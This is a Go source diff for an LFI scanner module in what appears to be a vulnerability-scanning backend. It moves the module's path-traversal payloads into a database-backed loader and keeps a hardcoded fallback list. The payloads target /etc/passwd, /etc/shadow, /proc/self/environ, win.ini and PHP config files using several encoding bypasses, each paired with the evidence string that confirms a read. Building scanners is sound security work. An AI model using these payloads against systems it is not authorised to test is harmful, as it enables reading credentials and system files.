@@ -7,15 +7,18 @@ import (
 	"strings"
 	"time"
 
+	"vulnscan-backend/model"
+	"vulnscan-backend/pkg/payload"
 	"vulnscan-backend/scan/engine"
 )
 
 type LFIScanner struct {
-	base *engine.VulnScanner
+	base     *engine.VulnScanner
+	payloads *payload.Loader
 }
 
-func New() *LFIScanner {
-	return &LFIScanner{}
+func New(loader *payload.Loader) *LFIScanner {
+	return &LFIScanner{payloads: loader}
 }
 
 func (m *LFIScanner) ID() string       { return "lfi" }
@@ -26,31 +29,75 @@ func (m *LFIScanner) Params() []engine.ModuleParam {
 	return []engine.ModuleParam{engine.VulnVerificationParam()}
 }
 
-type lfiPayload struct {
+type lfiPayloadEntry struct {
 	value    string
 	os       string
 	variant  string
 	evidence string
 }
 
-var payloads = []lfiPayload{
-	{"../../../../etc/passwd", "linux", "basic", "root:x:0:0"},
-	{"....//....//....//....//etc/passwd", "linux", "double-slash", "root:x:0:0"},
-	{"..%2F..%2F..%2F..%2Fetc%2Fpasswd", "linux", "url-encoded", "root:x:0:0"},
-	{"..%252f..%252f..%252f..%252fetc%252fpasswd", "linux", "double-url-encoded", "root:x:0:0"},
-	{"/etc/passwd", "linux", "absolute", "root:x:0:0"},
-	{"....\\....\\....\\....\\windows\\win.ini", "windows", "backslash", "[fonts]"},
-	{"..\\..\\..\\..\\windows\\win.ini", "windows", "basic-backslash", "[fonts]"},
-	{"../../../../windows/win.ini", "windows", "forward-slash", "[fonts]"},
-	{"/proc/self/environ", "linux", "proc-environ", "PATH="},
-	{"/proc/self/cmdline", "linux", "proc-cmdline", "/"},
-	{"php://filter/convert.base64-encode/resource=index.php", "php", "php-filter", "PD9waHA"},
-	{"php://filter/read=convert.base64-encode/resource=../config.php", "php", "php-filter-config", "PD9waHA"},
-	{"file:///etc/passwd", "linux", "file-protocol", "root:x:0:0"},
-	{"..%c0%af..%c0%af..%c0%afetc/passwd", "linux", "utf8-overlong", "root:x:0:0"},
-	{"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "linux", "unicode-slash", "root:x:0:0"},
-	{"/etc/shadow", "linux", "shadow", "root:"},
-	{"../../../../etc/hosts", "linux", "hosts", "localhost"},
+func (m *LFIScanner) getPayloads() []lfiPayloadEntry {
+	if m.payloads != nil {
+		dbPayloads := m.payloads.GetPayloads("lfi")
+		var result []lfiPayloadEntry
+		for _, p := range dbPayloads {
+			os := "linux"
+			if strings.Contains(p.Databases, "windows") {
+				os = "windows"
+			} else if strings.Contains(p.Databases, "php") {
+				os = "php"
+			}
+			evidence := p.Expect
+			if evidence == "" {
+				switch {
+				case strings.Contains(p.Value, "passwd"):
+					evidence = "root:x:0:0"
+				case strings.Contains(p.Value, "win.ini"):
+					evidence = "[fonts]"
+				case strings.Contains(p.Value, "php-filter"):
+					evidence = "PD9waHA"
+				case strings.Contains(p.Value, "shadow"):
+					evidence = "root:"
+				case strings.Contains(p.Value, "hosts"):
+					evidence = "localhost"
+				default:
+					evidence = "root:x:0:0"
+				}
+			}
+			result = append(result, lfiPayloadEntry{
+				value:    p.Value,
+				os:       os,
+				variant:  p.Tags,
+				evidence: evidence,
+			})
+		}
+		if len(result) > 0 {
+			return result
+		}
+	}
+	return defaultPayloads()
+}
+
+func defaultPayloads() []lfiPayloadEntry {
+	return []lfiPayloadEntry{
+		{"../../../../etc/passwd", "linux", "basic", "root:x:0:0"},
+		{"....//....//....//....//etc/passwd", "linux", "double-slash", "root:x:0:0"},
+		{"..%2F..%2F..%2F..%2Fetc%2Fpasswd", "linux", "url-encoded", "root:x:0:0"},
+		{"..%252f..%252f..%252f..%252fetc%252fpasswd", "linux", "double-url-encoded", "root:x:0:0"},
+		{"/etc/passwd", "linux", "absolute", "root:x:0:0"},
+		{"....\\....\\....\\....\\windows\\win.ini", "windows", "backslash", "[fonts]"},
+		{"..\\..\\..\\..\\windows\\win.ini", "windows", "basic-backslash", "[fonts]"},
+		{"../../../../windows/win.ini", "windows", "forward-slash", "[fonts]"},
+		{"/proc/self/environ", "linux", "proc-environ", "PATH="},
+		{"/proc/self/cmdline", "linux", "proc-cmdline", "/"},
+		{"php://filter/convert.base64-encode/resource=index.php", "php", "php-filter", "PD9waHA"},
+		{"php://filter/read=convert.base64-encode/resource=../config.php", "php", "php-filter-config", "PD9waHA"},
+		{"file:///etc/passwd", "linux", "file-protocol", "root:x:0:0"},
+		{"..%c0%af..%c0%af..%c0%afetc/passwd", "linux", "utf8-overlong", "root:x:0:0"},
+		{"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "linux", "unicode-slash", "root:x:0:0"},
+		{"/etc/shadow", "linux", "shadow", "root:"},
+		{"../../../../etc/hosts", "linux", "hosts", "localhost"},
+	}
 }
 
 func (m *LFIScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
@@ -96,7 +143,7 @@ func (m *LFIScanner) testTarget(ctx context.Context, target *engine.Target, veri
 			continue
 		}
 
-		for _, p := range payloads {
+		for _, p := range m.getPayloads() {
 			select {
 			case <-ctx.Done():
 				return findings
@@ -171,3 +218,5 @@ func isLikelyFileParam(name string) bool {
 	}
 	return true
 }
+
+var _ = model.VulnPayload{}
